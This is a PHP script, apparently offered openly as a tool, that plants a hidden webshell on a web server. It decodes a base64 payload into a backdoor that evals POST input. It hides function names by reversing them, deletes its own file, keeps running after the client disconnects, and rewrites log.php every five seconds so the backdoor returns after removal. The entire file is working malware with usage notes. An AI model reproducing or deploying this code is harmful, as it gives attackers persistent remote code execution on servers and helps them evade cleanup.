<?php
header("Content-Type: text/html; charset=utf-8");
static $time =10000 ;     //running time
static $yourcode = 'Cjw/cGhwIGV2YWwoJF9QT1NUW2NdKTs/Pg==';      //php base64 code(at the first your webshell need "\n" and then base64 encode)
//ReadMe：1.run this webshell，and will be create a webshell called log.php  2.this webshell create by php version 5.2
//auther:jhhua
//url：https://github.com/jhhua/phpshell/
//system information：windows+apache2.2+php5.2+mysql
function EasyTo($myfile,$author){
    fwrite($myfile,$author);
    return Fread($myfile,"111");  
}
class FileRead{
    function __construct($read,$num){
        $a = 1;
        if ($num != Null)
             $a = strlen($num);
        print Fread($read,$a);
    }
    function test(){
        echo "<br>"."ok\n";
    }
	function eb($yijufa){  
        $b = "_46esab";
		$e = "edocne";
		$eb = srv($e.$b);
        return $eb($yijufa);
		
    }
	function db($jiekai){  
        $c = "_46esab";
		$a = "edoced";
		$db = srv($a.$c);
        return $db($jiekai);
    }
}
function srv($str){   
    $new_str = "";
	for ($i = strlen($str)-1;$i >= 0; $i--){
        $new_str .= $str{$i};
    }
    return $new_str;
}
ignore_user_abort(true);
set_time_limit($time);  

while(1)
{
	$clear = fopen("log.php", "r");  
	fgets($clear);  
	echo $tmp = "\n".fgets($clear);  

    $myfile = fopen("log.php ", "a+");   
    $a = $myfile;
	$b = new FileRead($a,"asdasdasdasdasdasd");

	
  $t = date('Y-M-D H:i:s',time()); 
	$tt = $b->eb($t);  
	unlink(__FILE__);

	$code = $yourcode;  

	if(md5($tmp)===md5($b->db($code)))       
	{
		echo md5($tmp)."\n";
		echo md5($b->db($code));	
	}
    else
	    EasyTo($a,$b->db($tt.$code));   
	fclose($clear);
	fclose($myfile);
    usleep(5000000);
    
}
//fclose($a);
?>
